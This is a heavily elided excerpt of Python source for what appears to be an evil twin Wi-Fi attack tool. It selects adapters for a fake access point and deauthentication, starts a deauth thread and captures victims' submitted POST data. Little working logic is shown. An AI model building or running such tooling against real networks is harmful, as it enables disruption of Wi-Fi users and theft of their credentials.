...
class EwilTwin1:
    def __init__(self):
        ...
        self.wireless_mode2 = ""
        self.target_network = {}
        print(f"{RED} ** For Evil twin type1 attack you have to select 2 wireless adaptor. One for Fake access point and One for Deauthemtication. If you want to use same wireless adapter for both attack select same wireless adapter both times.{RESET}")
        self.start_eviltwin1()


    def start_eviltwin1(self):
        source = Sources()
        list_of_interfaces = []
        ...
        try:
            ...
            interfaceinput = input(f"\n{GREEN} Select wireless adapter for listening networks and Deauth Attack(Its mode would be changed to MOnitor). Type 0-{str(source.i - 1)} -->{RESET}")
            ...
            try:
                ...
                deauth.start()
                source.capture_get_post_request(self.wireless_interface1)
